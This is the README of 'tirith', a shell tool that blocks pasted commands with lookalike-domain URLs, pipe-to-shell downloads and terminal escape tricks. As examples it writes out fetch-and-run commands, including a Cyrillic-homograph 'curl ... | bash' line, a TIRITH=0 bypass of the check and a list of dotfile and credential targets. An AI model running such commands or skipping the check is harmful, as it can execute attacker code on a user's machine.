# tirith

**The gate between your clipboard and your shell.**

Tirith intercepts commands and pasted text in your terminal, detects suspicious URLs and deception, and blocks threats before they execute. No new commands to learn. No friction on clean input.

[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE-APACHE)

---

## The problem

```
You copy this from a README:
  curl -L https://foundry.paradіgm.xyz | bash
                          ^
                    Cyrillic і — not Latin i

Your browser would catch this. Your terminal won't.
```

Terminals render Unicode, ANSI escapes, and invisible characters without question. Tirith stands at the gate.

## Install

```bash
cargo install tirith
```

Then activate (add to your `.zshrc`, `.bashrc`, or `config.fish`):

```bash
eval "$(tirith init)"
```

That's it. Your shell is guarded.

## What happens

### Blocked — homograph domain piped to shell

```
$ curl -L https://foundry.paradіgm.xyz | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Non-ASCII characters in hostname
    Hostname contains Cyrillic і (U+0456) at position 16. This is a homograph
    attack — the URL visually mimics a legitimate domain but resolves elsewhere.
  [HIGH] curl_pipe_shell — Pipe to interpreter with suspicious URL
    curl output piped to bash with a blocked URL.
  Set TIRITH=0 to bypass (use with caution)
```

The command never executes.

### Warned — pipe-to-shell with clean URL

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    curl output piped directly to sh. Consider downloading first and reviewing.
```

The warning prints to stderr. The command runs.

### Silent — normal commands

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. Sub-millisecond overhead. You forget tirith is running.

## What it catches

| Category | Examples |
|----------|---------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in domain names, punycode domains, mixed-script labels |
| **Terminal deception** | ANSI escape injection, bidi overrides, zero-width characters, hidden carriage returns |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, process substitution, eval from download |
| **Credential exposure** | `http://user:pass@host`, userinfo tricks in URLs |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs |
| **Dotfile attacks** | Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` |

30 detection rules across 7 categories. Full list in `tirith check --json` output.

## What it never does

- **No network calls** during `check` or `paste` — all analysis is local
- **No command rewriting** — tirith never modifies what you typed
- **No telemetry** — nothing leaves your machine, ever
- **No background processes** — invoked per-command, exits immediately
- **No cloud dependency** — works offline, no accounts, no API keys

## Data handling

Tirith writes a local JSONL audit log to `~/.local/share/tirith/log.jsonl` containing:
- Timestamp, action taken, rule ID, redacted command preview
- **No** full commands, environment variables, or file contents

Disable logging entirely:
```bash
export TIRITH_LOG=0
```

Log location:
```bash
tirith doctor  # shows all paths
```

## Commands

| Command | Purpose |
|---------|---------|
| `tirith check -- <cmd>` | Analyze a command without executing |
| `tirith paste` | Analyze clipboard/pasted content |
| `tirith score <url>` | URL trust breakdown |
| `tirith diff <url>` | Byte-level Unicode diff for suspicious URLs |
| `tirith why` | Explain the last triggered rule |
| `tirith run <url>` | Download-first safe installer runner |
| `tirith receipt {last,list,verify}` | Install script tracking |
| `tirith init` | Print shell hook for `eval` |
| `tirith doctor` | Diagnostic info (paths, shell, policy) |

## Configuration

Tirith uses a YAML policy file. Discovery order:
1. `.tirith/policy.yaml` in current directory (walk up to root)
2. `~/.config/tirith/policy.yaml`

Example — allow a specific domain, escalate Docker rules:

```yaml
version: 1
allowlist:
  - "get.docker.com"
  - "sh.rustup.rs"

rules:
  docker_untrusted_registry:
    severity: critical

fail_mode: open  # or "closed" for strict environments
```

More examples in [docs/cookbook.md](docs/cookbook.md).

## Shell support

| Shell | Hook type | Tested on |
|-------|-----------|-----------|
| zsh | preexec + paste widget | 5.8+ |
| bash | preexec (two modes) | 5.0+ |
| fish | fish_preexec event | 3.5+ |
| PowerShell | PSReadLine handler | 7.0+ |

## Bypass

For the rare case you know exactly what you're doing:

```bash
TIRITH=0 curl -L https://something.xyz | bash
```

Organizations can disable this via policy:
```yaml
allow_bypass: false
```

## Docs

- [Threat model](docs/threat-model.md) — what tirith defends against and what it doesn't
- [Cookbook](docs/cookbook.md) — policy examples for common setups
- [Troubleshooting](docs/troubleshooting.md) — shell quirks, latency, false positives
- [Compatibility](docs/compatibility.md) — stable vs experimental surface
- [Security policy](SECURITY.md) — vulnerability reporting
- [Uninstall](docs/uninstall.md) — clean removal per shell and package manager

## License

Apache-2.0. See [LICENSE-APACHE](LICENSE-APACHE) for details.

Third-party data attributions in [NOTICE](NOTICE).
